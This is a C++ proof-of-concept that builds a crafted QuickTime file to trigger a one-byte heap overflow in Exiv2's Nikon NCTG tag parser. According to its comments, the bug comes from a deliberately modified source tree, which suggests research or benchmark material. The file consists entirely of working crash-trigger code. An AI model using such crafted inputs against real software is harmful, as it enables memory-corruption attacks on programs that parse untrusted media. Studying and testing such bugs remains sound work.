// PoC for the delocalized QuickTime Nikon NCTG heap overflow.
//
// Drives the public Exiv2 API on an in-contract input: a small QuickTime
// (.MOV) file whose udta atom holds a Nikon NCTG tag list containing one
// ASCII entry whose declared payload length is exactly 200 bytes.
//
//   QuickTimeVideo::userDataDecoder() -> "NCTG" -> NikonTagsDecoder()
//       entry: [TagID:4][dataType:2][dataLength:2][payload:200]
//
// On the original maintenance batch the payload buffer is 201 bytes and the
// length check rejects dataLength >= buf.size(), so a 200 byte payload plus
// its nul terminator fits. On the modified tree the two edited commits
// disagree about that contract and the terminator byte is written one byte
// past the end of the 200 byte heap buffer.
#include <exiv2/exiv2.hpp>

#include <cstddef>
#include <cstdio>

namespace {

// big-endian 32/16 bit writers
void be32(unsigned char* p, unsigned long v) {
  p[0] = static_cast<unsigned char>((v >> 24) & 0xff);
  p[1] = static_cast<unsigned char>((v >> 16) & 0xff);
  p[2] = static_cast<unsigned char>((v >> 8) & 0xff);
  p[3] = static_cast<unsigned char>(v & 0xff);
}

void be16(unsigned char* p, unsigned long v) {
  p[0] = static_cast<unsigned char>((v >> 8) & 0xff);
  p[1] = static_cast<unsigned char>(v & 0xff);
}

}  // namespace

int main(void) {
  // 16 (ftyp) + 8 (udta header) + 8 (NCTG header) + 8 (NCTG entry header)
  // + 200 (entry payload)
  static const size_t kPayload = 200;
  static const size_t kNctgEntry = 4 + 2 + 2 + kPayload;
  static const size_t kNctg = 8 + kNctgEntry;
  static const size_t kUdta = 8 + kNctg;
  static const size_t kFileSize = 16 + kUdta;

  unsigned char file[kFileSize];
  for (size_t i = 0; i < kFileSize; ++i)
    file[i] = 0x41;  // 'A'

  // ftyp box: brand "qt  " so the file is recognised as QuickTime
  be32(file + 0, 16);
  file[4] = 'f';
  file[5] = 't';
  file[6] = 'y';
  file[7] = 'p';
  file[8] = 'q';
  file[9] = 't';
  file[10] = ' ';
  file[11] = ' ';
  be32(file + 12, 0x00000000);  // minor version

  // udta box wrapping one NCTG atom
  be32(file + 16, kUdta);
  file[20] = 'u';
  file[21] = 'd';
  file[22] = 't';
  file[23] = 'a';

  be32(file + 24, kNctg);
  file[28] = 'N';
  file[29] = 'C';
  file[30] = 'T';
  file[31] = 'G';

  // Nikon NCTG entry: ordinary tag, ASCII data, 200 byte payload.
  // A 200 byte payload is within the documented 200 byte limit, i.e. this
  // is in-contract input for the parser.
  be32(file + 32, 0x00000001);  // TagID
  be16(file + 36, 0x0002);      // dataType 2 = ASCII
  be16(file + 38, kPayload);    // dataLength = 200

  try {
    auto image = Exiv2::ImageFactory::open(file, sizeof(file));
    if (!image) {
      std::puts("no image");
      return 0;
    }
    image->readMetadata();
    std::puts("readMetadata completed");
  } catch (const Exiv2::Error& e) {
    std::printf("exiv2 error: %s\n", e.what());
  }
  return 0;
}
